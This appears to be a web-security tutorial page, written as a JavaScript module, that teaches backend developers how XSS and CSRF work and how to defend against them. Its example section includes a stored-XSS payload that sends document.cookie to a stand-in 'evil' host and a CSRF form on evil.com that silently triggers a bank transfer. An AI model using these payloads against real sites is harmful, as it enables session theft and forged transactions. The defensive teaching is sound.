import { asked, cheat, code, h, js, link, links, note, p, table, tip, warn } from '../blocks.js';

export const doc = {
  blocks: [
    p(
      'Two browser attacks that a backend developer has to understand even when the backend renders no HTML. **XSS** runs attacker script in your users\' pages; **CSRF** makes their browser send an authenticated request they did not intend. They are frequently confused, and the defences are completely different.',
    ),
    table(
      ['', 'XSS', 'CSRF'],
      [
        ['The attacker', 'Runs script **on your origin**', 'Makes the browser send a request **to your origin**'],
        ['Needs', 'Unescaped output somewhere', 'A cookie sent automatically'],
        ['Can read the response', 'Yes', '**No** — blocked by the same-origin policy'],
        ['Stopped by', 'Escaping on output, and a CSP', '`SameSite` cookies, and CSRF tokens'],
        ['Beats the other\'s defence', 'Yes — XSS defeats every CSRF defence', 'No'],
      ],
    ),
    warn(
      'That last row matters: an attacker running script on your origin can read your CSRF token and make any request as the user. **XSS is strictly the more serious bug**, and CSRF defences assume you do not have one.',
    ),

    h('XSS'),
    code(
      js(`
// Stored XSS — the payload is saved, then served to everyone who views it.
POST /tasks  { "title": "<img src=x onerror=\\"fetch('//evil/'+document.cookie)\\">" }

// Reflected XSS — echoed straight back from the request.
GET /search?q=<script>…</script>
res.send(\`<h1>Results for \${req.query.q}</h1>\`);      // vulnerable

// DOM XSS — the server is not involved at all; front-end code does it.
element.innerHTML = location.hash.slice(1);
`),
    ),
    p('What an attacker does once script runs on your origin: read `localStorage`, call your API as the user, read the CSRF token, rewrite the page to phish, keylog the login form. Anything the user can do.'),

    h('Escaping is contextual'),
    p(
      'There is no single "sanitise" function, because the correct escaping depends on where the value lands.',
    ),
    table(
      ['Context', 'Escape'],
      [
        ['HTML text', '`&` `<` `>` — what a template engine does by default'],
        ['An HTML attribute', 'The above, plus quotes; and always quote the attribute'],
        ['Inside `<script>`', 'JavaScript escaping — or better, do not put data there'],
        ['A URL', '`encodeURIComponent`'],
        ['CSS', 'Effectively unescapable — do not put user data in CSS'],
      ],
    ),
    code(
      js(`
// Store what the user typed. Escape at each output.
res.render('task', { title: task.title });        // the engine escapes
<div>{{ title }}</div>                            // Handlebars, escaped
<div>{{{ title }}}</div>                          // triple braces — RAW, unsafe

// React escapes by default:
<div>{title}</div>                                                    // safe
<div dangerouslySetInnerHTML={{ __html: title }} />                   // not
`),
    ),
    warn(
      'Escaping on **input** is the classic mistake. You do not know at write time whether the value will be rendered in HTML, put in a URL, written to a CSV or read back by an API client — and you have now corrupted the stored data for all of them.',
    ),

    h('When you must accept HTML'),
    code(
      js(`
// A rich-text field is a genuine requirement. Sanitise it on OUTPUT, with a
// real parser and an allowlist. Never with a regular expression.
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const DOMPurify = createDOMPurify(new JSDOM('').window);

const safe = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li', 'code'],
  ALLOWED_ATTR: ['href'],
});
`),
    ),
    warn(
      'Never write your own HTML sanitiser. Stripping `<script>` misses `onerror`, `javascript:` URLs, SVG payloads, mutation XSS and a dozen more. This problem is genuinely hard and DOMPurify has already solved it.',
    ),

    h('Does a JSON API have XSS?'),
    p('Mostly not directly, but three ways it participates:'),
    code(
      js(`
// 1. Stored payloads. Your API stores the script; the front end renders it.
//    Your API is the delivery mechanism even though it never rendered anything.

// 2. Wrong Content-Type. If a response is served as text/html, the browser
//    renders it — and your JSON string becomes markup.
res.setHeader('Content-Type', 'application/json');    // and 'nosniff'

// 3. User-uploaded files served from your origin. An uploaded .html executes
//    with access to your cookies.
res.setHeader('Content-Type', 'application/octet-stream');
res.setHeader('X-Content-Type-Options', 'nosniff');
res.setHeader('Content-Disposition', 'attachment');
// Better still: serve uploads from a separate domain entirely.
`),
    ),

    h('Content Security Policy'),
    p(
      'The strongest XSS defence, because it works even when escaping fails: the browser refuses to execute script the policy does not permit.',
    ),
    code(
      js(`
import helmet from 'helmet';

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],                 // no inline script, no CDNs
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'", 'https://api.example.com'],
    frameAncestors: ["'none'"],            // clickjacking
    objectSrc: ["'none'"],
  },
}));
`),
    ),
    tip(
      'The whole value is in banning inline script. `script-src \'self\'` means an injected `<script>` or `onerror=` does not run, whatever slipped past your escaping. `\'unsafe-inline\'` in `script-src` gives that away entirely — use a nonce if you genuinely need inline script.',
    ),

    h('CSRF'),
    code(
      js(`
<!-- On evil.com. The victim is logged in to bank.example. -->
<form action="https://bank.example/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
`),
    ),
    p(
      'The browser attaches the victim\'s cookie automatically, because cookies are sent by **destination**, not by who initiated the request. The transfer happens. The attacker never sees the response — but for a state-changing request, they do not need to.',
    ),
    warn(
      'CSRF only works when credentials are attached **automatically**. That is cookies, and HTTP Basic auth. A token the client puts in an `Authorization` header by hand is not attached automatically, which is why a pure bearer-token API is not vulnerable.',
    ),

    h('Defence 1: SameSite'),
    code(
      js(`
res.cookie('sid', id, { httpOnly: true, secure: true, sameSite: 'lax' });
`),
    ),
    table(
      ['Value', 'Sent cross-site?'],
      [
        ['`Lax`', 'Only on top-level `GET` navigations — so a cross-site `POST` carries no cookie'],
        ['`Strict`', 'Never — following a link from an email leaves you logged out'],
        ['`None`', 'Always. Requires `Secure`, and reopens CSRF'],
      ],
    ),
    note(
      '`Lax` is now the browser default, which eliminated most classic CSRF. Set it explicitly anyway — you should not depend on a default, and older browsers still exist. And if `Lax` is protecting you, then a `GET` must never change state: that is the rule it relies on.',
    ),

    h('Defence 2: a CSRF token'),
    code(
      js(`
// Needed when SameSite=None is unavoidable — a front end on a different site.
// The double-submit pattern: the same value in a cookie and in a header.
// Cross-site JavaScript cannot READ the cookie, so it cannot set the header.

app.get('/csrf', (req, res) => {
  const token = crypto.randomBytes(32).toString('base64url');
  res.cookie('csrf', token, { sameSite: 'strict', secure: true });  // readable
  res.json({ csrfToken: token });
});

export const checkCsrf = (req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  const cookie = req.cookies?.csrf;
  const header = req.get('X-CSRF-Token');
  if (!cookie || !header) throw new ForbiddenError('CSRF token missing');

  const a = Buffer.from(cookie), b = Buffer.from(header);
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
    throw new ForbiddenError('CSRF token mismatch');
  }
  next();
};
`),
    ),
    tip(
      'The CSRF cookie is deliberately **not** `HttpOnly` — the page has to read it to set the header. That is fine: it is not a credential, and it is useless to an attacker who cannot read it cross-origin.',
    ),

    h('Do I need CSRF protection?'),
    table(
      ['Setup', 'Vulnerable?'],
      [
        ['Session cookie, `SameSite=Lax`, same site', 'Largely protected — `Lax` blocks cross-site writes'],
        ['Session cookie, `SameSite=None`', '**Yes.** Add tokens'],
        ['`Authorization: Bearer`, token in JS memory', 'No — nothing is attached automatically'],
        ['Refresh token in a cookie', '**The refresh endpoint is.** Give it `SameSite=Strict` and a narrow `path`'],
      ],
    ),
    warn(
      'CORS is not a CSRF defence. A cross-origin `POST` with a simple content type is sent **without** a preflight — CORS only stops the attacker reading the response, not the request arriving and taking effect.',
    ),

    h('Cheatsheet'),
    cheat([
      ['Prevent XSS', 'Escape on output, in the right context'],
      ['Accept rich text', 'DOMPurify with an allowlist — never a regex'],
      ['Defence in depth for XSS', 'A CSP without `unsafe-inline`'],
      ['Protect a session cookie', '`HttpOnly; Secure; SameSite=Lax`'],
      ['Serve uploaded files', '`nosniff`, `attachment`, ideally another domain'],
      ['Prevent CSRF', '`SameSite`, plus tokens if you need `None`'],
      ['Never', 'A state-changing `GET`'],
      ['Not a CSRF defence', 'CORS'],
    ]),

    h('Interview'),
    asked([
      ['XSS vs CSRF?', 'XSS runs attacker script on your origin; CSRF makes the browser send an authenticated request the user did not intend.'],
      ['Which is worse?', 'XSS — it defeats every CSRF defence, because the attacker can read the token.'],
      ['Does a JSON API need CSRF protection?', 'Only if it authenticates with cookies. A bearer token in a header is not attached automatically.'],
      ['How does `SameSite=Lax` help?', 'The cookie is not sent on cross-site state-changing requests, so the forged `POST` is unauthenticated.'],
      ['`localStorage` or a cookie for a token?', 'An `HttpOnly` cookie — XSS can still act as the user but cannot exfiltrate the token.'],
      ['Why escape on output rather than input?', 'The correct escaping depends on the destination — HTML, attribute, URL, CSV — which you do not know at input time.'],
      ['Is CORS a CSRF defence?', 'No — it stops the attacker reading the response, not the request being sent and acted on.'],
    ]),

    links(
      link('OWASP — XSS Prevention Cheat Sheet', 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'),
      link('OWASP — CSRF Prevention Cheat Sheet', 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html'),
      link('MDN — Content Security Policy', 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP'),
    ),
  ],
};
